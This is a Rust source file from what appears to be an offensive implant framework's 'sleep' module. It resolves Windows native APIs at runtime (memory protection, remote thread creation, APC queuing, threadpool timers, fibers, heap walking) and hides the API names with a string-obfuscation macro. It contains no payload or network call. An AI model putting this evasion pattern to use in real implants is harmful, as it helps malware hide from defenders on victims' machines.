#![allow(
    non_snake_case,
    non_camel_case_types,
    non_upper_case_globals,
    clippy::missing_transmute_annotations
)]

use core::ffi::c_void;
use core::mem::transmute;
use core::ptr::null_mut;
use std::sync::OnceLock;

use malefic_gateway::obfstr::obfstr as s;

use crate::kit::apis::{m_get_proc_address, m_load_library_a};
use crate::sleep::types::*;

// ── One-time initialization ──────────────────────────────────────────

static WINAPIS: OnceLock<Winapis> = OnceLock::new();

// ── DLL wrapper ──────────────────────────────────────────────────────

#[derive(Default, Debug, Clone, Copy)]
pub struct Modules {
    pub ntdll: Dll,
    pub kernel32: Dll,
    pub cryptbase: Dll,
    pub kernelbase: Dll,
}

#[derive(Default, Debug, Clone, Copy)]
#[repr(transparent)]
pub struct Dll(u64);

impl Dll {
    #[inline]
    pub fn as_ptr(self) -> *mut c_void {
        self.0 as *mut c_void
    }

    #[inline]
    pub fn as_u64(self) -> u64 {
        self.0
    }
}

impl From<*const c_void> for Dll {
    fn from(ptr: *const c_void) -> Self {
        Self(ptr as u64)
    }
}

impl From<*mut c_void> for Dll {
    fn from(ptr: *mut c_void) -> Self {
        Self(ptr as u64)
    }
}

impl From<u64> for Dll {
    fn from(addr: u64) -> Self {
        Self(addr)
    }
}

impl From<Dll> for u64 {
    fn from(dll: Dll) -> Self {
        dll.0
    }
}

// ── WinAPI function pointer wrapper ──────────────────────────────────

#[derive(Default, Debug, Clone, Copy)]
#[repr(transparent)]
pub struct WinApi(u64);

impl WinApi {
    #[inline]
    pub fn as_ptr(self) -> *const c_void {
        self.0 as *const c_void
    }

    #[inline]
    pub fn as_mut_ptr(self) -> *mut c_void {
        self.0 as *mut c_void
    }

    #[inline]
    pub fn is_null(self) -> bool {
        self.0 == 0
    }

    #[inline]
    pub fn as_u64(self) -> u64 {
        self.0
    }
}

impl From<*const c_void> for WinApi {
    fn from(ptr: *const c_void) -> Self {
        Self(ptr as u64)
    }
}

impl From<*mut c_void> for WinApi {
    fn from(ptr: *mut c_void) -> Self {
        Self(ptr as u64)
    }
}

impl From<u64> for WinApi {
    fn from(addr: u64) -> Self {
        Self(addr)
    }
}

impl From<WinApi> for u64 {
    fn from(api: WinApi) -> Self {
        api.0
    }
}

// ── Resolved function pointers ───────────────────────────────────────

pub struct Winapis {
    pub NtSignalAndWaitForSingleObject: NtSignalAndWaitForSingleObjectFn,
    pub NtQueueApcThread: NtQueueApcThreadFn,
    pub NtAlertResumeThread: NtAlertResumeThreadFn,
    pub NtDuplicateObject: NtDuplicateObjectFn,
    pub NtCreateEvent: NtCreateEventFn,
    pub NtWaitForSingleObject: NtWaitForSingleObjectFn,
    pub NtClose: NtCloseFn,
    pub NtSetEvent: NtSetEventFn,
    pub TpAllocPool: TpAllocPoolFn,
    pub TpSetPoolStackInformation: TpSetPoolStackInformationFn,
    pub TpSetPoolMinThreads: TpSetPoolMinThreadsFn,
    pub TpSetPoolMaxThreads: TpSetPoolMaxThreadsFn,
    pub TpAllocTimer: TpAllocFn,
    pub TpSetTimer: TpSetTimerFn,
    pub TpAllocWait: TpAllocFn,
    pub TpSetWait: TpSetWaitFn,
    pub CloseThreadpool: CloseThreadpoolFn,
    pub RtlWalkHeap: RtlWalkHeapFn,
    pub ConvertFiberToThread: ConvertFiberToThreadFn,
    pub ConvertThreadToFiber: ConvertThreadToFiberFn,
    pub CreateFiber: CreateFiberFn,
    pub DeleteFiber: DeleteFiberFn,
    pub SwitchToFiber: SwitchToFiberFn,
    pub NtAllocateVirtualMemory: NtAllocateVirtualMemoryFn,
    pub NtProtectVirtualMemory: NtProtectVirtualMemoryFn,
    pub NtLockVirtualMemory: NtLockVirtualMemoryFn,
    pub NtCreateThreadEx: NtCreateThreadExFn,
    pub GetProcessHeap: GetProcessHeapFn,
    pub RtlCreateHeap: RtlCreateHeapFn,
    pub RtlAllocateHeap: RtlAllocateHeapFn,
    pub RtlFreeHeap: RtlFreeHeapFn,
}

/// Returns a reference to the resolved Winapis structure.
#[inline]
pub fn winapis() -> &'static Winapis {
    WINAPIS.get_or_init(|| unsafe {
        let ntdll = m_load_library_a(s!("ntdll.dll\0").as_ptr());
        let kernel32 = m_load_library_a(s!("kernel32.dll\0").as_ptr());
        let kernelbase = m_load_library_a(s!("kernelbase.dll\0").as_ptr());

        Winapis {
            NtSignalAndWaitForSingleObject: transmute(m_get_proc_address(
                ntdll,
                s!("NtSignalAndWaitForSingleObject\0").as_ptr(),
            )),
            NtQueueApcThread: transmute(m_get_proc_address(
                ntdll,
                s!("NtQueueApcThread\0").as_ptr(),
            )),
            NtAlertResumeThread: transmute(m_get_proc_address(
                ntdll,
                s!("NtAlertResumeThread\0").as_ptr(),
            )),
            NtDuplicateObject: transmute(m_get_proc_address(
                ntdll,
                s!("NtDuplicateObject\0").as_ptr(),
            )),
            NtCreateEvent: transmute(m_get_proc_address(ntdll, s!("NtCreateEvent\0").as_ptr())),
            NtWaitForSingleObject: transmute(m_get_proc_address(
                ntdll,
                s!("NtWaitForSingleObject\0").as_ptr(),
            )),
            NtClose: transmute(m_get_proc_address(ntdll, s!("NtClose\0").as_ptr())),
            NtSetEvent: transmute(m_get_proc_address(ntdll, s!("NtSetEvent\0").as_ptr())),
            TpAllocPool: transmute(m_get_proc_address(ntdll, s!("TpAllocPool\0").as_ptr())),
            TpSetPoolStackInformation: transmute(m_get_proc_address(
                ntdll,
                s!("TpSetPoolStackInformation\0").as_ptr(),
            )),
            TpSetPoolMinThreads: transmute(m_get_proc_address(
                ntdll,
                s!("TpSetPoolMinThreads\0").as_ptr(),
            )),
            TpSetPoolMaxThreads: transmute(m_get_proc_address(
                ntdll,
                s!("TpSetPoolMaxThreads\0").as_ptr(),
            )),
            TpAllocTimer: transmute(m_get_proc_address(ntdll, s!("TpAllocTimer\0").as_ptr())),
            TpSetTimer: transmute(m_get_proc_address(ntdll, s!("TpSetTimer\0").as_ptr())),
            TpAllocWait: transmute(m_get_proc_address(ntdll, s!("TpAllocWait\0").as_ptr())),
            TpSetWait: transmute(m_get_proc_address(ntdll, s!("TpSetWait\0").as_ptr())),
            CloseThreadpool: transmute(m_get_proc_address(
                kernel32,
                s!("CloseThreadpool\0").as_ptr(),
            )),
            RtlWalkHeap: transmute(m_get_proc_address(ntdll, s!("RtlWalkHeap\0").as_ptr())),
            ConvertFiberToThread: transmute(m_get_proc_address(
                kernelbase,
                s!("ConvertFiberToThread\0").as_ptr(),
            )),
            ConvertThreadToFiber: transmute(m_get_proc_address(
                kernelbase,
                s!("ConvertThreadToFiber\0").as_ptr(),
            )),
            CreateFiber: transmute(m_get_proc_address(kernelbase, s!("CreateFiber\0").as_ptr())),
            DeleteFiber: transmute(m_get_proc_address(kernelbase, s!("DeleteFiber\0").as_ptr())),
            SwitchToFiber: transmute(m_get_proc_address(
                kernelbase,
                s!("SwitchToFiber\0").as_ptr(),
            )),
            NtAllocateVirtualMemory: transmute(m_get_proc_address(
                ntdll,
                s!("NtAllocateVirtualMemory\0").as_ptr(),
            )),
            NtProtectVirtualMemory: transmute(m_get_proc_address(
                ntdll,
                s!("NtProtectVirtualMemory\0").as_ptr(),
            )),
            NtLockVirtualMemory: transmute(m_get_proc_address(
                ntdll,
                s!("NtLockVirtualMemory\0").as_ptr(),
            )),
            NtCreateThreadEx: transmute(m_get_proc_address(
                ntdll,
                s!("NtCreateThreadEx\0").as_ptr(),
            )),
            GetProcessHeap: transmute(m_get_proc_address(
                kernel32,
                s!("GetProcessHeap\0").as_ptr(),
            )),
            RtlCreateHeap: transmute(m_get_proc_address(ntdll, s!("RtlCreateHeap\0").as_ptr())),
            RtlAllocateHeap: transmute(m_get_proc_address(ntdll, s!("RtlAllocateHeap\0").as_ptr())),
            RtlFreeHeap: transmute(m_get_proc_address(ntdll, s!("RtlFreeHeap\0").as_ptr())),
        }
    })
}

// ── Wrapper functions ────────────────────────────────────────────────

#[inline]
pub fn NtClose(Handle: HANDLE) -> NTSTATUS {
    unsafe { (winapis().NtClose)(Handle) }
}

#[inline]
pub fn NtSetEvent(hEvent: *mut c_void, PreviousState: *mut i32) -> NTSTATUS {
    unsafe { (winapis().NtSetEvent)(hEvent, PreviousState) }
}

#[inline]
pub fn NtWaitForSingleObject(Handle: HANDLE, Alertable: u8, Timeout: *mut i32) -> NTSTATUS {
    unsafe { (winapis().NtWaitForSingleObject)(Handle, Alertable, Timeout) }
}

#[inline]
pub fn NtCreateEvent(
    EventHandle: *mut HANDLE,
    DesiredAccess: u32,
    ObjectAttributes: *mut c_void,
    EventType: EVENT_TYPE,
    InitialState: u8,
) -> NTSTATUS {
    unsafe {
        (winapis().NtCreateEvent)(
            EventHandle,
            DesiredAccess,
            ObjectAttributes,
            EventType,
            InitialState,
        )
    }
}

#[inline]
pub fn NtDuplicateObject(
    SourceProcessHandle: HANDLE,
    SourceHandle: HANDLE,
    TargetProcessHandle: HANDLE,
    TargetHandle: *mut HANDLE,
    DesiredAccess: u32,
    HandleAttributes: u32,
    Options: u32,
) -> NTSTATUS {
    unsafe {
        (winapis().NtDuplicateObject)(
            SourceProcessHandle,
            SourceHandle,
            TargetProcessHandle,
            TargetHandle,
            DesiredAccess,
            HandleAttributes,
            Options,
        )
    }
}

#[inline]
pub fn NtLockVirtualMemory(
    ProcessHandle: HANDLE,
    BaseAddress: *mut *mut c_void,
    RegionSize: *mut usize,
    MapType: u32,
) -> NTSTATUS {
    unsafe { (winapis().NtLockVirtualMemory)(ProcessHandle, BaseAddress, RegionSize, MapType) }
}

#[inline]
pub fn NtAllocateVirtualMemory(
    ProcessHandle: HANDLE,
    BaseAddress: *mut *mut c_void,
    ZeroBits: usize,
    RegionSize: *mut usize,
    AllocationType: u32,
    Protect: u32,
) -> NTSTATUS {
    unsafe {
        (winapis().NtAllocateVirtualMemory)(
            ProcessHandle,
            BaseAddress,
            ZeroBits,
            RegionSize,
            AllocationType,
            Protect,
        )
    }
}

#[inline]
pub fn NtProtectVirtualMemory(
    ProcessHandle: *mut c_void,
    BaseAddress: *mut *mut c_void,
    RegionSize: *mut usize,
    NewProtect: u32,
    OldProtect: *mut u32,
) -> NTSTATUS {
    unsafe {
        (winapis().NtProtectVirtualMemory)(
            ProcessHandle,
            BaseAddress,
            RegionSize,
            NewProtect,
            OldProtect,
        )
    }
}

#[inline]
pub fn NtAlertResumeThread(ThreadHandle: HANDLE, PreviousSuspendCount: *mut u32) -> NTSTATUS {
    unsafe { (winapis().NtAlertResumeThread)(ThreadHandle, PreviousSuspendCount) }
}

#[inline]
pub fn NtQueueApcThread(
    ThreadHandle: HANDLE,
    ApcRoutine: *mut c_void,
    ApcArgument1: *mut c_void,
    ApcArgument2: *mut c_void,
    ApcArgument3: *mut c_void,
) -> NTSTATUS {
    unsafe {
        (winapis().NtQueueApcThread)(
            ThreadHandle,
            ApcRoutine,
            ApcArgument1,
            ApcArgument2,
            ApcArgument3,
        )
    }
}

#[inline]
pub fn NtSignalAndWaitForSingleObject(
    SignalHandle: HANDLE,
    WaitHandle: HANDLE,
    Alertable: u8,
    Timeout: *mut LARGE_INTEGER,
) -> NTSTATUS {
    unsafe {
        (winapis().NtSignalAndWaitForSingleObject)(SignalHandle, WaitHandle, Alertable, Timeout)
    }
}

#[inline]
pub fn TpAllocPool(PoolReturn: *mut *mut c_void, Reserved: *mut c_void) -> NTSTATUS {
    unsafe { (winapis().TpAllocPool)(PoolReturn, Reserved) }
}

#[inline]
pub fn TpSetPoolStackInformation(
    Pool: *mut c_void,
    PoolStackInformation: *mut TP_POOL_STACK_INFORMATION,
) -> NTSTATUS {
    unsafe { (winapis().TpSetPoolStackInformation)(Pool, PoolStackInformation) }
}

#[inline]
pub fn TpSetPoolMinThreads(Pool: *mut c_void, MinThreads: u32) -> NTSTATUS {
    unsafe { (winapis().TpSetPoolMinThreads)(Pool, MinThreads) }
}

#[inline]
pub fn TpSetPoolMaxThreads(Pool: *mut c_void, MaxThreads: u32) {
    unsafe { (winapis().TpSetPoolMaxThreads)(Pool, MaxThreads) }
}

#[inline]
pub fn TpAllocTimer(
    Timer: *mut *mut c_void,
    Callback: *mut c_void,
    Context: *mut c_void,
    CallbackEnviron: *mut TP_CALLBACK_ENVIRON_V3,
) -> NTSTATUS {
    unsafe { (winapis().TpAllocTimer)(Timer, Callback, Context, CallbackEnviron) }
}

#[inline]
pub fn TpSetTimer(Timer: *mut c_void, DueTime: *mut LARGE_INTEGER, Period: u32, WindowLength: u32) {
    unsafe { (winapis().TpSetTimer)(Timer, DueTime, Period, WindowLength) }
}

#[inline]
pub fn TpAllocWait(
    WaitReturn: *mut *mut c_void,
    Callback: *mut c_void,
    Context: *mut c_void,
    CallbackEnviron: *mut TP_CALLBACK_ENVIRON_V3,
) -> NTSTATUS {
    unsafe { (winapis().TpAllocWait)(WaitReturn, Callback, Context, CallbackEnviron) }
}

#[inline]
pub fn TpSetWait(Wait: *mut c_void, Handle: *mut c_void, Timeout: *mut LARGE_INTEGER) {
    unsafe { (winapis().TpSetWait)(Wait, Handle, Timeout) }
}

#[inline]
pub fn CloseThreadpool(Pool: *mut c_void) -> NTSTATUS {
    unsafe { (winapis().CloseThreadpool)(Pool) }
}

#[inline]
pub fn RtlWalkHeap(HeapHandle: *mut c_void, Entry: *mut RTL_HEAP_WALK_ENTRY) -> NTSTATUS {
    unsafe { (winapis().RtlWalkHeap)(HeapHandle, Entry) }
}

#[inline]
pub fn GetProcessHeap() -> *mut c_void {
    unsafe { (winapis().GetProcessHeap)() }
}

#[inline]
pub fn RtlCreateHeap(
    Flags: u32,
    HeapBase: *mut c_void,
    ReserveSize: usize,
    CommitSize: usize,
    Lock: *mut c_void,
    Parameters: *mut c_void,
) -> *mut c_void {
    unsafe { (winapis().RtlCreateHeap)(Flags, HeapBase, ReserveSize, CommitSize, Lock, Parameters) }
}

#[inline]
pub fn RtlAllocateHeap(HeapHandle: *mut c_void, Flags: u32, Size: usize) -> *mut c_void {
    unsafe { (winapis().RtlAllocateHeap)(HeapHandle, Flags, Size) }
}

#[inline]
pub fn RtlFreeHeap(HeapHandle: *mut c_void, Flags: u32, BaseAddress: *mut c_void) -> i8 {
    unsafe { (winapis().RtlFreeHeap)(HeapHandle, Flags, BaseAddress) }
}

#[inline]
pub fn ConvertFiberToThread() -> i32 {
    unsafe { (winapis().ConvertFiberToThread)() }
}

#[inline]
pub fn ConvertThreadToFiber(lpParameter: *mut c_void) -> *mut c_void {
    unsafe { (winapis().ConvertThreadToFiber)(lpParameter) }
}

#[inline]
pub fn CreateFiber(
    dwStackSize: usize,
    lpStartAddress: LPFIBER_START_ROUTINE,
    lpParameter: *const c_void,
) -> *mut c_void {
    unsafe { (winapis().CreateFiber)(dwStackSize, lpStartAddress, lpParameter) }
}

#[inline]
pub fn DeleteFiber(lpFiber: *mut c_void) {
    unsafe { (winapis().DeleteFiber)(lpFiber) }
}

#[inline]
pub fn SwitchToFiber(lpFiber: *mut c_void) {
    unsafe { (winapis().SwitchToFiber)(lpFiber) }
}

pub fn NtCreateThreadEx(
    ThreadHandle: *mut HANDLE,
    DesiredAccess: u32,
    ObjectAttributes: *mut c_void,
    ProcessHandle: HANDLE,
    StartRoutine: *mut c_void,
    Argument: *mut c_void,
    CreateSuspended: u32,
    ZeroBits: u32,
    StackSize: u32,
    MaximumStackSize: u32,
    AttributeList: *mut c_void,
) -> NTSTATUS {
    unsafe {
        (winapis().NtCreateThreadEx)(
            ThreadHandle,
            DesiredAccess,
            ObjectAttributes,
            ProcessHandle,
            StartRoutine,
            Argument,
            CreateSuspended,
            ZeroBits,
            StackSize,
            MaximumStackSize,
            AttributeList,
        )
    }
}

/// Lightweight NtSetEvent wrapper for use as a threadpool callback.
pub extern "C" fn NtSetEvent2(_: *mut c_void, event: *mut c_void, _: *mut c_void, _: u32) {
    NtSetEvent(event, null_mut());
}
